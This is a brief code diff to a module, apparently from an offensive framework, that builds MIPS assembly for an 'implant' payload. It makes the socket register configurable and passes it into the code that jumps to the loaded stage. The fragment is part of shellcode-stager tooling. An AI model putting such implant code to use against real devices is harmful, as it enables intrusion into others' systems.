@@ -29,6 +29,8 @@ class PawnModule(Module, Assembler):
         self.length = IntegerOption(4096, 'Length of the implant.', True)
         self.reliable = BooleanOption('yes', 'Make payload reliable.', True)
 
+        self.sock = Option('$s2', 'Register in which to put sock.', True, True)
+
     def run(self):
         payload = dedent(f"""\
         start:
@@ -128,9 +130,9 @@ class PawnModule(Module, Assembler):
                 bne $s0, $zero, fail
             """)
 
-        payload += dedent("""\
+        payload += dedent(f"""\
             lw   $s1, -8($sp)
-            lw   $s2, -4($sp)
+            lw   {self.sock.value}, -4($sp)
             jalr $s1
         """)
 
